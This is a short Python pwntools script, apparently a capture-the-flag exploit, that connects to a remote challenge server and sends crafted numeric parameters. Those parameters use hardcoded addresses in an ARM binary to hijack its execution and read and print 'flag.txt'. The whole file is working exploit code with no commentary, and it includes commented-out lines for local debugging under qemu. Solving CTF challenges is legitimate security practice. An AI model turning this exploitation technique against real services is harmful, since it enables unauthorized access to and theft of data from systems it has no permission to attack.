from pwn import *
#p = process(["qemu-arm","-g","1234","-L","/usr/arm-linux-gnueabi","./challenge.elf"])
#p = process(["qemu-arm","-L","/usr/arm-linux-gnueabihf","./challenge.elf"])
p = remote("flu.xxx", 20040)
plt_fread = 0x010510
ret = 0x010aa4
flag = 0x0022058
fmt_s = 0x111fc
p.sendline(str(1056))
p.recvuntil("please gimme your 3 parameters:\n")
p.sendline(str(0x107cc) + " " + str(0) + " " + str(0))

p.sendline(str(4919))
p.recvuntil("please gimme your 3 parameters:\n")
p.sendline(str(fmt_s) + " " + str(flag) + " " + str(0))

p.sendline("flag.txt")
p.sendline(str(48))
p.recvuntil("please gimme your 3 parameters:\n")
p.sendline(str(1) + " " + str(2) + " " + str(3))

p.interactive()